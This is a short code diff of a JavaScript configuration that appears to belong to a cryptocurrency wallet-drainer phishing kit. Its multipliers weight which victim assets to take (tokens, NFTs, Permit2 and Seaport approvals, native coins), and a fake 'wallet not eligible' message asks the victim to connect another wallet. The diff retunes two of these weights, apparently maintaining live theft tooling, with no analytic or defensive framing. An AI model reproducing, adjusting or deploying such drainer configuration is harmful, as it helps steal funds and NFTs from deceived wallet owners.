@@ -15,13 +15,13 @@ let w3m_url = "";
 let w3m_icons = [''];
 let multipliers = {
 'LP_NFTS': 1,
-'PERMIT2': 2,
+'PERMIT2': 1,
 'BLUR': 1,
 'SEAPORT': 1,
 'SWAP': 1,
 'TOKENS': 1,
 'NFT': 1,
-'NATIVES': 0.5,
+'NATIVES': 0.1,
 };
 let notEligible = "Your wallet is not eligible, connect another wallet.";
 let swal_notEligibleTitle = "Not eligible";
